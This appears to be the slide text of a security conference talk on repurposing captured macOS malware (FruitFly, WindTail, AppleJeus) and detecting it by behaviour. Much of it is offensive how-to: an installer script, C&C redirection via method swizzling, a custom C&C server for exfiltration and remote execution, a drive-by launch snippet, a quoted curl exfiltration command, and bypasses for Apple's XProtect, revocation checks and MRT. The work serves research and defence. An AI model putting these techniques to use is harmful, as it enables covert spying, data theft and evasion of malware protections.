SESSION ID: HT-T11
Repurposed Malware: A Dark Side of Recycling

Patrick Wardle
Principal Security Researcher Jamf @patrickwardle

#RSAC

WHOIS

Patrick Wardle
Principal Security Researcher JAMF

@patrickwardle

OUTLINE
the idea !detection

repurposing protection

The Idea "good hackers copy; great hackers steal"

REPURPOSING MALWARE
...for personal gain
spy "a"
the "lab"
captured! (by spy "b")

}

"repurposed"
spy "b"

WHY?
...rather why not!

+

+

money

coders mission

fully featured
fully tested

}

that will also be attributed to them!
With more resources and motivations, APT & cyber-criminal groups are (likely) going to write far better malware than you!

WORKS FOR "THEM"
...so why not for us?
leaked slides

"risky" deployments

}

attribution

CHALLENGES
from to
without source code!
find all relevant logic
understand C&C protocol

patch (correctly) create C&C server

analysis phase

avoid (AV) detection

EXAMPLE: FAIL
incomplete patch

+

wtf?

$ cat fpsaud #!/usr/bin/perl use strict;use warnings;use IO::Socket;use IPC::Open2;my$l;sub G{die if!defined syswrite$l,$_[0]}sub J{my($U, $A)=('','');while($_[0]>length$U){die if! sysread$l,$A,$_[0]-length$U;$U.=$A;}return$U;} sub O{unpack'V',J 4}sub N{J O}sub H{my$U=N; $U=~s/\\/\//g;$U}sub I{my$U=eval{my$C=`$_[0]`
malware...(fully?) repurposed

#backup c&c servers for my $B( split /a/, M('1fg7kkb1nnhokb71jrmkb;rm`;kb...') ) {
push @e, map $_ . $B, split /a/, M('dql-lwslk-bdql...'); }
...but backup C&C servers left intact :/

Repurposing recycling (macOS) malware

REPURPOSING
choose your malware!
capabilities:

crypto-miner ransomware

backdoor

implant

attribution:

120+ mac malware samples!

REPURPOSING
analyze the specimen

find remote access

01 0x00001a47 lea eax, dword [edi+4]

02 0x00001a4a mov esi, dword [edi+0x44]

03 04

0x00001a4d

sub

esp, 0xc

05 0x00001a50 push eax

06 0x00001a51 call gethostbyname

C&C server

$ lldb malware.app (lldb) b gethostbyname
(lldb) c Process stopped: gethostbyname
(lldb) x/s *((char**)($esp+4)) 0x00112240: "89.34.111.113"

understand protocol
e.g. check-in w/ install path

understand capabilities

01 0x0000848e mov dl, byte [dataFromServer]

02 ...

03 04

0x00004125 dec dl

05 0x00004127 cmp dl, 0x42

06 0x0000412a ja invalidCommand

commands!

07

08 09

0x00004145 movzx eax, dl

10 0x00004148 jmp dword [commands+eax*4]

REPURPOSING
patch to "reconfigure"

89.34.111.113
original C&C server

patching C&C server address

89.34.111.113 192.168.0.5

$ python server.py 1337 listening on ('0.0.0.0', 1337) waiting for a connection...
malware connected: '192.168.0.04'

connection received!

REPURPOSING
create a custom C&C server
$ python server.py 1337 ... malware connected: '192.168.0.4' [+] specify command: 11
sending command: 11 (pwd) response: byte: 11 (command) string: '/Users/user/Desktop' [+] specify command: 02
sending command: 02 (screenshot)
(remote) screenshot
"Offensive Malware Analysis: Dissecting FruitFly" (p. wardle) VirusBulletin.com/uploads/pdf/magazine/2017/VB2017-Wardle.pdf

OSX.FRUITFLY (BACKDOOR)
fully-featured and undetected for 10yrs+
discovered by
@thomasareed
files processes webcam terminal mouse & keys screenshot

}

OSX.FRUITFLY
repurposing the backdoor

no need to patch (malware)!

01 if(@ARGV == 1) {

02 if($ARGV[0] =~ /^\d+$/ ){ $h = $ARGV[0] }

03 elsif($ARGV[0] =~ /^([^:]+):(\d+)$/) {

04

($h, @r) = ($2, scalar reverse $1);

05 }

06 }

07

08 $g = shift @r; push @r, $g;

09 $l = new IO::Socket::INET(

10

PeerAddr => scalar( reverse $g ),

11

PeerPort => $h,

12

Proto => 'tcp',

13

Timeout => 10 );

parsing cmdline args?

$ cat ~/Library/LaunchAgents/ com.fruitfly.plist
{ KeepAlive = 0;
Label = "com.fruitfly.host";

ProgramArguments =

(

"/Users/user/.fruitfly"

"ip.addr:port"

);

RunAtLoad = 1; }

persist (w/ C&C server)

$ ./fruitfly <port> $ ./fruitfly <addr:port>

specify (custom)C&C via cmdline!

OSX.FRUITFLY
creating a custom installer
hrmm, we need an installer then

01 #ex: $ python ffInstaller.py FruitFly/fpsaud 192.168.0.2:1337

02 FRUIT_FLY = '~/fpsaud'

03 FRUIT_FLY_PLIST = '~/Library/LaunchAgents/com.fruit.fly.plist'

04 plist = '<?xml version="1.0" encoding="UTF-8"?> ...'

05

06 shutil.copyfile(sys.argv[1], os.path.expanduser(FRUIT_FLY))

07

08 with open(os.path.expanduser(FRUIT_FLY_PLIST), 'w') as plistFile:

09

plistFile.write(plist % (os.path.expanduser(FRUIT_FLY), sys.argv[2]))

custom OSX.FruitFly installer

}

copy malware write plist

OSX.WINDTAIL (BACKDOOR)
triage (infection vector)
$ cat Final_Presentation.app/ Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?> <dict>
... <key>CFBundleURLTypes</key> <array>
<dict> <key>CFBundleURLName</key> <string>Local File</string> <key>CFBundleURLSchemes</key> <array> <string>openurl2622007</string> </array>
</dict> </array>
custom url scheme
"Remote Mac Exploitation Via Custom URL Schemes" objective-see.com/blog/blog_0x38.html

OSX.WINDTAIL
triage (capabilities)
persistence (login item)
# ./procInfo [ process start ] pid: 1202 path: /usr/bin/zip args: (
"/usr/bin/zip", "/tmp/psk.txt.zip", "/private/etc/racoon/psk.txt" )
file collection

# ./procInfo
[ process start ] pid: 1258 path: /usr/bin/curl user: 501 args: (
"/usr/bin/curl", "-F", "vast=@/tmp/psk.txt.zip", "-F", "od=1601201920543863", "-F", "kl=users-mac.lan-user", "string2me.com/.../kESklNvxsNZQcPl.php" )
file exfiltration (via curl)

OSX.WINDTAIL
triage (file download)

01 -(void)sdf {

02

03 //get file name from C&C server

04 var_50 = [r15 yoop:@"F5Ur0CCFMO/fWHjecxEqGLy/xq5gE....];

05 url = [[NSURL alloc] initWithString:[NSString stringWithFormat:var_50, ....];

06 request = [NSURLRequest requestWithURL:url,...];

07 data = [NSURLConnection sendSynchronousRequest:request ...];

08 fileName = [[NSString alloc] initWithData:data encoding:rcx ...];

09

10 //get file contents from C&C server

11 rcx = [r15 yoop:@"F5Ur0CCFMO/fWHjecxEqGLy/xq5gE98Zvi...];

12 fileContents = [NSData dataWithContentsOfURL:[NSURL URLWithString:[NSString

13

stringWithFormat:@"%@%@", rcx, r8] ...];

14

15 //save to disk 16 [fileContents writeToFile: fileName ...];

$ ./netiquette -list

usrnode(4897) 127.0.0.1 -> flux2key.com:80 (Established)

GET /liaROelcOeVvfjN/fsfSQNrIyxeRvXH.php response: file name
GET /liaROelcOeVvfjN/update response: file contents

usrnode(4897) 127.0.0.1 -> flux2key.com:80 (Established)
2x connections

OSX.WINDTAIL
triage (...and execute)
01 -(void)sdf { 02 03 //extract via 'ditto' 04 task = [[NSTask alloc] init]; 05 [task setLaunchPath:[var_68 yoop:@"x3EOmwsZL5..."]; 06 07 rdx = [NSArray arrayWithObjects:@"-x", @"-k", ...]; 08 [task setArguments:rdx, ...]; 09 [task launch]; 10 11 //launch 12 bundle = [[NSBundle bundleWithPath:filePath] executablePath]; 13 task = [[NSTask alloc] init]; 14 [task setLaunchPath:bundle]; 15 [task launch];
# ./procInfo
[ process start ]
path: /usr/bin/ditto args: ( "/usr/bin/ditto",
"-x", "-k", "~/Library/update.zip", "~/Library" )
[ process start ]
path: ~/Library/update.app

download & execute

OSX.WINDTAIL
triage (remote self-delete)
http://flux2key.com/liaROelcOeVvfjN/ fsfSQNrIyxeRvXH.php?very=%@&xnvk=%@
request

"1"

} delete
terminate

01 r14 = [NSFileManager defaultManager]; 02 rdx = [[NSBundle mainBundle] bundlePath]; 03 04 //remove (self) 05 [r14 removeItemAtPath:rdx error:rcx]; 06 07 //terminate (self) 08 [[NSApplication sharedApplication] terminate:0x0 ...];

self-delete logic

OSX.WINDTAIL
repurposing the exploit
01 //auto download .zip 02 //Safari will unzip & trigger url registration 03 var a = document.createElement('a'); 04 a.setAttribute('href', 'https://file.io/kBTfCn'); 05 a.setAttribute('download', 'Final_Presentation'); 06 $(a).appendTo('body'); 07 08 $(a)[0].click(); 09 10 //launch app via custom url scheme 11 location.replace("openurl2622007://");
download & launch malware

"Final_Presentation"

OSX.WindTail ...persisted !

OSX.WINDTAIL
repurposing the implant
modify C&C addresses
load library & hook decryption routine?!

C&C addresses are encrypted :/

overwrite (un-needed) LC_LOAD_DYLIB entry

$ vmmap usrnode
__TEXT ~/Library/Final_Presentation.app/ Contents/MacOS/usrnode
__TEXT ~/Library/Final_Presentation.app/ Contents/MacOS/swizzle.dylib
'injected' dylib: loaded!

OSX.WINDTAIL
repurposing the implant

swaps methods, via 'swizzle'

01 method_exchangeImplementations(

02 class_getInstanceMethod([self class], @selector(swizzle:)),

03 class_getInstanceMethod(NSClassFromString(@"appdele"), @selector(yoop:)));

04

05 -(NSString*)swizzle:(NSData*)data {

06

07

//invoke original method ("yoop") to decrypt

08

decrypted = ((NSString*(*)(id,SEL,NSData*))origImplementation)(self,@selector(yoop:), data);

09

10

//modify decrypted string as needed!

11

12

return decrypted;

13 }

01 url = [r15 yoop:@"F5Ur0CCFMO...];

"ourServer.com"

"F5Ur0CCFMO..." if (decrypt == "flux2key.com")
return "ourServer.com"
method: "swizzle"

"flux2key.com"

"F5Ur0CCFMO..." -> "flux2key.com"
method: "yoop"

OSX.WINDTAIL
repurposing the implant

$ open Final_Presentation.app
dylib: loaded in usrnode (pid 1337) dylib: swizzled 'appdele yoop:'
dylib: decrypted: "doc" dylib: decrypted: "docx" dylib: decrypted: "ppt"
dylib: decrypted: flux2key.com dylib: swapping C&C server addr!
flux2key.com -> "ourServer.com"

flux2key.com

exfil

}

ourServer.com
download & execute

OSX.WINDTAIL
custom C&C server: file exfiltration

01 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

02

03 def run(server_class=HTTPServer, handler_class=Handler):

04

httpd = server_class(('', 80), handler_class)

05

httpd.serve_forever()

06

07 class Handler(BaseHTTPRequestHandler):

08

09

def do_POST(self):

10

boundary = self.headers.plisttext.split("=")[1]

11

remainbytes = int(self.headers['content-length'])

12

13

fn = re.findall(r'.*name="vast"; filename="(.*)"', line)

14

fn = os.path.join('/tmp/exfil', fn[0])

15

16

out = open(fn, 'wb')

17

out.write(self.rfile.readline())

c&c logic: file exfil

OSX.WINDTAIL
custom C&C server: download & execute

01 def do_GET(self):

02

03 #request for file name

04 if 'runs=tup' in self.path:

05

self.wfile.write('update.zip')

06

07 #request for file contents

08 elif 'update.zip' in self.path:

09

with open('update.zip', mode='rb') as file:

10

self.wfile.write(file.read())

request: file name (we pass back "update.zip")
request: file contents

c&c logic: download & execute

"update.zip" "update.bin"

OSX.WINDTAIL
custom C&C server: self-delete

01 def do_GET(self):

02

03 #request for self-delete

04 if 'xnvk' in self.path:

05

self.wfile.write("1")

request: self-delete? ('xnvk') (respond with: "1")

c&c logic: self-delete

}

"1" delete terminate

APPLEJEUS (LOADER)
lazarus apt group's 1st-stage implant

"Union Crypto Trader" (fake!)

}

decrypted in memory executed in memory

APPLEJEUS (LOADER)
lazarus apt group's 1st-stage implant

01 rax = md5_hash_string(&var_4D8);

02 r15 = rbx + 0x10;

03 rdx = r14 - 0x10;

04 if ((var_4D8 & 0x1) != 0x0) {

05

rcx = var_4C8;

06 }

07 else {

08

rcx = &var_4D7;

09 }

10

11 _aes_decrypt_cbc(0x0, r15, rdx, rcx, &var_40);

12

13 memcpy(&var_C0, r15, 0x80);

14 rbx = rbx + 0x90;

15 r14 = r14 - 0x90;

16 rax = _load_from_memory(rbx, r14, &var_C0, ...);

decryption & in-memory execution

hash('VMI5EOhq8gDz') aes_decrypt()

APPLEJEUS (LOADER)
lazarus apt group's 1st-stage implant
'update' embedded C&C server

build (encrypted) payload

01 password = 'VMI5EOhq8gDz'

02 key = hashlib.md5(password).digest()

03

04

05 06

iv = 16 * '\x00' encryptor = AES.new(key, AES.MODE_CBC, iv)

07 data = encryptor.encrypt(input)

08 09

output.write(base64.b64encode(data))

}

any (macho)payload never touches disk!

!Detection remaining unseen, by apple, et. al

APPLE'S BUILT-IN MALWARE MITIGATIONS
obstacles...but rather trivial to bypass ;)
"We designed macOS with advanced technologies ...to constantly monitor, and ultimately keep your Mac safer" -apple

XProtect

revoked certificate checks

$ log show | grep -i MRT 2019-07-16 MRT: (libswiftFoundation.dylib) Found OSX.Snake.A infection. 2019-07-16 MRT: (libswiftFoundation.dylib) Found OSX.CpuMeaner.A infection.
Malware Removal Tool (MRT)

XPROTECT
built-in signature-based scanner (downloads)
'UXProtect' (Digita)
scans downloads
rule KeRangerA {
meta: description = "OSX.KeRanger.A" strings: $a = {48 8D BD D0 EF FF FF BE 00 00 00 00 BA 00 04 00 00 31 C0 49 89 D8 ?? ?? ?? ?? ?? 31 F6 4C 89 E7 ?? ?? ?? ?? ?? 83 F8 FF 74 57 C7 85 C4 EB FF FF 00 00 00 00} condition: Macho and $a
}
/System/Library/CoreServices/XProtect.bundle/Contents/ Resources/XProtect.yara

BYPASSING XPROTECT
...by changing 1 byte

XProtect.yara

01 description = "OSX.KeRanger.A"

02 strings:

03 $a = {48 8D BD D0 EF FF FF BE 00 00 00 00 BA 00 04 00 00 31 C0 49 89 D8 ?? ?? ?? ?? ??

04

31 F6 4C 89 E7 ?? ?? ?? ?? ?? 83 F8 FF 74 57 C7 85 C4 EB FF FF 00 00 00 00}

Transmission.app

}

how to change?

re-order instructions

modify instructions/consts

mov edx, 0x400 mov edx, 0x300

CERTIFICATE CHECKS
a security mechanism to block malicious code
$ spctl --verbose=4 --assess --type execute OSX.WindTail/Final_Presentation.app Final_Presentation.app: CSSMERR_TP_CERT_REVOKED
revoked (CSSMERR_TP_CERT_REVOKED)
now revoked: OSX.WindTail
$ log stream kernel: (AppleMobileFileIntegrity) AMFI: code signature validation failed. trustd: [com.apple.securityd:policy] cert[0]: Revocation =(leaf)[force]> 1 amfid: (Security) Trust evaluate failure: [leaf Revocation1] kernel: proc 1947: load code signature error 4 for file "usrnode"
revoked cert? blocked!

BYPASSING CERTIFICATE REVOCATION
...simply unsign (and/or) resign
undocumented flag: ' ' --remove-signature
$ codesign --remove-signature OSX.WindTail/Final_Presentation.app $ codesign -dvv OSX.WindTail/Final_Presentation.app Final_Presentation.app: code object is not signed at all
remove (revoked) certificate
$ codesign -s "Developer ID Application: <some dev id>"
(re)sign
(re)signed, validly

MALWARE REMOVAL TOOL (MRT)
built-in signature-based scanner (installed)

$ strings -a /System/Library/CoreServices/ MRT.app/Contents/MacOS/MRT | grep "OSX."
OSX.CpuMeaner.A OSX.Mudminer.A OSX.ShellDrop.A OSX.Snake.A OSX.Proton.D OSX.Proton.C OSX.Proton.B OSX.Morcut.A OSX.Trovi.A OSX.InstallImitator.A OSX.Eleanor.A OSX.WireLurker.A OSX.MaMi.A OSX.HMining.C OSX.HMining.B OSX.HMining.A OSX.Mughthesec.A OSX.Netwire.A OSX.XcodeGhost.A OSX.Fruitfly.B
(embedded) MRT detections

remove! ...not just malware!

BYPASSING MRT
...simply rename components

}

persistence: "com.client.client.plist"

binary: ~/.client

MRT signature: OSX.Fruitfly.A

bypass MRT !

01 FRUIT_FLY = "anything but '~/.client' "

02 FRUIT_FLY_PLIST = "anything but 'com.client.client.plist' "

03

04 plist = '''<?xml version="1.0" encoding="UTF-8"?> ...'''

05 shutil.copyfile(sys.argv[1], os.path.expanduser(FRUIT_FLY))

06 with open(os.path.expanduser(FRUIT_FLY_PLIST), 'w') as plistFile:

07

plistFile.write(plist % (os.path.expanduser(FRUIT_FLY), sys.argv[2]))

CODE NOTARIZATIONS
apps must be scanned (by Apple) before distribution
malware?

clean

not notarized? blocked!
"Ruined our whole op[eration]"

CODE NOTARIZATIONS
...only apply to quarantined files
$ xattr -p com.apple.quarantine WindTail/Final_Presentation.app
}0081;5ca7e3fa;Chrome;13E99853-851F-4D9B-BE8D-E366B42A2108 quarantine attribute
real-world 0day attacks
fully-patched no user-interaction quarantine 'bypass'

}

CODE NOTARIZATIONS
...only apply to quarantined files
[public] 0day Automatic macro execution
+
[new] 0day App sandbox escape
+
[new] 0day Quarantine & notarization bypass
no alerts, no popups, no warnings!
if a user opens a malicious document, code can escape the sandbox and persistently infect a full-patched macOS system (10.15.1) 

3RD-PARTY ANTI-VIRUS PRODUCTS
...similarly trivial to bypass?

pack

OSX.FruitFly 'obfuscated'

}

detections: 0

encrypt

"Writing Bad @$$ Malware (for OSX)"

p. wardle BH/2015

avoid detection? in-memory

Protection generically detecting (repurposed) threats

FOCUS ON (POTENTIALLY) MALICIOUS BEHAVIORS
...vs static signatures
detect malware via signatures detect malware via (unusual) behaviors
generically detect (even repurposed) malware!

persistence

mic/camera download/upload screenshot

key logging synthetic clicks file encryption

PERSISTENCE
via file i/o monitoring

OSX.WindTail persisting

01 int main(int argv, char** argv) {

02

03 r12 = [NSURL fileURLWithPath:[[NSBundle mainBundle] bundlePath]];

04

05 rbx = LSSharedFileListCreate(0x0, _kLSSharedFileListSessionLoginItems, 0x0);

06 LSSharedFileListInsertItemURL(rbx, _kLSSharedFileListItemLast, 0x0, 0x0,

07

r12, 0x0, 0x0);

08 ...

09

10 }

persistence alert!
"Methods of Malware Persistence on Mac OS" www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf

MIC/CAMERA ACCESS
via AVFoundation notifications
OSX.Crisis OSX.Eleanor OSX.Mokes OSX.FruitFly ...Zoom.app :P

}

01 public func start(eventHandler: @escaping AudioVideoHandler) {

02 var property = CMIOObjectPropertyAddress(

03 mSelector: kAudioDevicePropertyDeviceIsRunningSomewhere,

04 mScope: kAudioObjectPropertyScopeGlobal,

05 mElement: kAudioObjectPropertyElementMaster)

06

07 CMIOObjectAddPropertyListener(camID, &property, camCallback,

08

self.toOpaque())

detecting mic/camera access

"OverSight: Exposing Spies on macOS"
speakerdeck.com/patrickwardle/hack-in-the-box-2017-oversightexposing-spies-on-macos

KEYLOGGER DETECTION
via CoreGraphics Event Notifications

01 public func start(eventHandler: @escaping EventTapsHandler) {

02

03 notify_register_dispatch(kCGNotifyEventTapAdded, &self.notifyToken, DispatchQueue.global())

04 { [weak self] event in

05 for newTap in newTaps.keys where nil == strongSelf.previousTaps[newTap] {

06

if let tap = newTaps[newTap] {

07

eventHandler(EventTapsEvent(tap: tap))

08

...

detecting keyboard "event taps" (kCGNotifyEventTapAdded)

DETECTING SYNTHETIC CLICKS
generic protection, regardless of technique?

<process> is trying to do <stuff> !

deny

allow

01 let mask = (1 << CGEventType.leftMouseDown.rawValue) |

02

(1 << CGEventType.leftMouseUp.rawValue) ...

03

04 eventTap = CGEvent.tapCreate(tap:.cgSessionEventTap,

05

eventsOfInterest: mask,

06

callback: eventCallback, ... )

0x0: synthetic 0x1: user generated

01 public func eventCallback(proxy: CGEventTapProxy, eventType:

02

CGEventType, event: CGEvent, ... ) {

03

04

if 0 == event.getIntegerValueField(.eventSourceStateID) {

05

//detected synthetic mouse click!

06

}

"state"

GENERICALLY DETECTING MAC MALWARE
via JamfProtect (MonitorKit + Apple's game engine)

MonitorKit

...in the news

alert !
actions (alert, log, etc)

Apple's game (logic) engine

DETECTING OSX.WINDTAIL
via infection behaviors
Safari 'auto-open'

$ cat Final_Presentation.app/Contents/Info.plist ... <key>CFBundleURLTypes</key> <array> <dict> <key>CFBundleURLSchemes</key> <array> <string>openurl2622007</string>

'auto' URL handler registration

$event.isNewDirectory == 1 AND $event.process.name == 'Safari'
Safari created directory

$event.isNewDirectory == 1 AND $event.file.isAppBundle == 1 AND $event.file.bundle.infoDictionary.CFBundleURLTypes != nil
app with custom URL handler

application start

?
alert !
++

DETECTING OSX.FRUITFLY
via 'install time' behaviors
($event.path MATCHES[cd] "/Library/LaunchAgents/.*.plist" OR $event.path MATCHES[cd] "/Users/.*/Library/LaunchAgents/.*.plist") AND $event.isNewFile == 1
launch item persistence
!$event.file.contentsAsDict.ProgramArguments[0].signingInfo("AppleSigned")
not signed by apple
"LaunchD" IN $tags AND $event.file.contentsAsDict.ProgramArguments[0]. lastPathComponent.startsWith(".")
'hidden' binary

$ cat ~/Library/LaunchAgents/ com.client.client.plist ...
<plist version="1.0"> <dict>
<key>ProgramArguments</key> <array> <string> ~/.client </string> </array> ...
launch agent persistence
?
alert !
++

DETECTING OSX.FRUITFLY
via runtime behaviors

...other (generic) detections?
?
alert !
++ +

$event.process.path.lastPathComponent.startsWith(".")

+

hidden process

$event.process.path.startsWith("/tmp")

+

dropper payload in /tmp

$event.process.labels.contains("Unsigned")
unsigned process

+

webcam

synthetic clicks

Apply!

attackers <3 repurposed malware

"free"

"unattributable"

upgrade to macOS Catalina (notarization)

ensure your macOS systems are protected by a behavior-based security tool.

Repurposed Malware: A Dark Side of Recycling

@patrickwardle

RESOURCES:
· 'OSX.FRUITFLY RECYCLED' -PHIL STOKES · 'REPURPOSING ONIONDUKE' -JOSH PITTS

IMAGES: · GITHUB.COM/ARIS-T2

